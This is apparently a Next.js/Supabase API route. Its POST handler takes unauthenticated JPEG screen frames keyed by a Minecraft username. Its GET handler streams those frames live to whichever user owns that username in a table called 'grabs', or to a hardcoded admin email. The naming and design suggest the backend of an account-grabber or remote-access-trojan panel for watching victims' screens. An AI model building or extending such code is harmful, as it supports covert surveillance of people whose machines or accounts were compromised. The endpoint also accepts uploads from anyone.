export const dynamic = 'force-dynamic';

import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

function getClient() {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { cookies: { getAll() { return []; }, setAll() {} } }
  );
}

export async function POST(request) {
  try {
    const authHeader = request.headers.get('authorization');
    const contentType = request.headers.get('content-type');

    let username = 'unknown';
    if (authHeader) {
      username = authHeader.replace('Bearer ', '');
    }

    if (contentType === 'image/jpeg') {
      const buffer = await request.arrayBuffer();
      const base64 = Buffer.from(buffer).toString('base64');
      const frame = 'data:image/jpeg;base64,' + base64;
      const timestamp = Date.now();

      const supabase = getClient();
      const { error } = await supabase
        .from('stream_frames')
        .upsert(
          { username, frame, updated_at: new Date().toISOString() },
          { onConflict: 'username' }
        );

      if (error) {
        return NextResponse.json({ error: error.message }, { status: 500 });
      }

      return NextResponse.json({ ok: true });
    }

    return NextResponse.json({ error: 'Invalid request' }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ error: e.message }, { status: 500 });
  }
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const username = searchParams.get('username');

  const supabase = getClient();

  if (username) {
    const supabaseAuth = getClientAuth(request);
    const { data: { user } } = await supabaseAuth.auth.getUser();
    if (!user) return NextResponse.json({ online: false });

    const { data: grab } = await supabase
      .from('grabs')
      .select('id')
      .eq('minecraft_username', username)
      .eq('owner_email', user.email)
      .limit(1)
      .single();

    const isAdmin = user.email === 'lifegrading@gmail.com';
    if (!grab && !isAdmin) return NextResponse.json({ online: false });

    const { data: row } = await supabase
      .from('stream_frames')
      .select('frame, updated_at')
      .eq('username', username)
      .single();

    if (!row || Date.now() - new Date(row.updated_at).getTime() > 10000) {
      return NextResponse.json({ online: false });
    }
    return NextResponse.json({ online: true, frame: row.frame, timestamp: new Date(row.updated_at).getTime() });
  }

  const { data: allFrames } = await supabase
    .from('stream_frames')
    .select('username, updated_at');

  const now = Date.now();
  const online = (allFrames || [])
    .filter(f => now - new Date(f.updated_at).getTime() < 10000)
    .map(f => ({ username: f.username, timestamp: new Date(f.updated_at).getTime() }));

  if (online.length === 0) {
    return NextResponse.json({ online: [] });
  }

  const supabaseAuth = getClientAuth(request);
  const { data: { user } } = await supabaseAuth.auth.getUser();
  const isAdmin = user?.email === 'lifegrading@gmail.com';

  if (isAdmin) {
    return NextResponse.json({ online });
  }

  if (!user) {
    return NextResponse.json({ online: [] });
  }

  const ownerEmails = {};
  for (const u of online) {
    if (!ownerEmails[u.username]) {
      const { data: grab } = await supabase
        .from('grabs')
        .select('owner_email')
        .eq('minecraft_username', u.username)
        .limit(1)
        .single();
      ownerEmails[u.username] = grab?.owner_email || null;
    }
    u.owner_email = ownerEmails[u.username];
  }

  const filtered = online.filter(u => u.owner_email === user.email);
  return NextResponse.json({ online: filtered });
}